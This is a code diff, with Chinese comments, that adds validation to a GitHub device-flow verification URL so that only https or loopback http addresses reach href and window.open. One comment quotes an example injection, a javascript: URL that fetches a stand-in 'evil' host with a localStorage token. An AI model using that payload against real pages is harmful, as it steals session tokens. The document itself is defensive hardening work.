@@ -41,6 +41,34 @@ function baseOf(settings) {
   return `${parsed.origin}${parsed.pathname}`.replace(/\/+$/, '')
 }
 
+/**
+ * GitHub device flow 的验证地址，页面可以拿到的那一份。
+ *
+ * `verifyUrl` 来自反馈服务，随后直接进 `href` 与 `window.open` —— 它是**页面
+ * 将要跳转**的地址，未经校验就是一个脚本入口：被攻破或配错的收集端可以回
+ * `javascript:fetch('//evil/'+localStorage.token)`，用户在管理页点一下就在
+ * 持有管理会话的同源里执行了它。React 19 会把 `javascript:` 的 href 换成抛错
+ * 的 URL，伤害被压到一个 href —— 但旁边的 `window.open` 是原生调用，浏览器
+ * 认什么协议它就跟着走，而"以后的 React 不再警告"不是防线。
+ *
+ * 因此只接受 https（本机收集端另允许 loopback http，与 baseOf 同一个例外），
+ * 其余一律退回 GitHub 官方验证页而不是让登录失败：看不到验证码的用户没有
+ * 任何下一步，而验证码就显示在这个链接旁边。
+ *
+ * @param {unknown} value 收集端返回的 verifyUrl
+ * @returns {string} 安全的 http(s) 绝对地址
+ */
+export function safeVerifyUrl(value) {
+  const fallback = 'https://github.com/login/device'
+  if (typeof value !== 'string' || value === '' || value.length > 2048) return fallback
+  let parsed
+  try { parsed = new URL(value.trim()) } catch { return fallback }
+  if (parsed.username || parsed.password) return fallback
+  const loopback = ['127.0.0.1', 'localhost', '[::1]'].includes(parsed.hostname)
+  if (parsed.protocol !== 'https:' && !(loopback && parsed.protocol === 'http:')) return fallback
+  return parsed.href
+}
+
 async function call(url, init = {}) {
   let response
   try {
@@ -79,7 +107,7 @@ export function createFeedback({ settings, persist }) {
       if (typeof body.session !== 'string' || typeof body.userCode !== 'string') throw fail(502, '反馈服务器返回了无法识别的登录响应')
       return {
         session: body.session, userCode: body.userCode,
-        verifyUrl: typeof body.verifyUrl === 'string' ? body.verifyUrl : 'https://github.com/login/device',
+        verifyUrl: safeVerifyUrl(body.verifyUrl),
         expiresIn: Number(body.expiresIn) || 900,
       }
     },
